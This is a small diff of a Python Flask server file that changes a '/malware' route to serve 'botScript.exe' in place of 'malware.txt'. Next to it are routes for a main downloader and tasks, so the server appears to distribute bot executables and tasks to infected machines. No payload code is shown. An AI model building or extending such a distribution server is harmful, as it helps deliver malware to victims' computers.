@@ -48,7 +48,7 @@ def getMainDownloader():
 
 @app.route('/malware', methods=['GET'])
 def getMalware():
-    return send_file(os.path.join(DOWNLOAD_PATH, "malware.txt"))
+    return send_file(os.path.join(DOWNLOAD_PATH, "botScript.exe"))
 
 @app.route('/task1', methods=['GET'])
 def getTask1():
